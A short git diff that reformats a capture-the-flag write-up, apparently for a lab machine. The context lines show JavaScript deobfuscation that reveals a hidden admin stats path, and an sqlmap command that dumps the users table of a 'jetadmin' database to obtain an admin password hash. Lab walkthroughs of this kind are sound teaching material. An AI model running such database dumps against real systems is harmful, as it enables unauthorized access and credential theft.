@@ -160,7 +160,7 @@ $ console.log(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,
 ```
 When we run it we can see that it makes a request to stats.php a directory which ruta would have been impossible to obtain by applying brute force.
 
-```secure.js
+```console secure.js
 function getStats()
 {
     $.ajax({url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",  
@@ -278,7 +278,9 @@ Database: jetadmin
 | users |
 +-------+
 ```
+
 Now we can simply use the parameter `-dump` to dump all the existing columns in the users table and get a `hash` user `admin`
+
 
 ```console
 $ sqlmap -r request --batch -D jetadmin -T users -dump
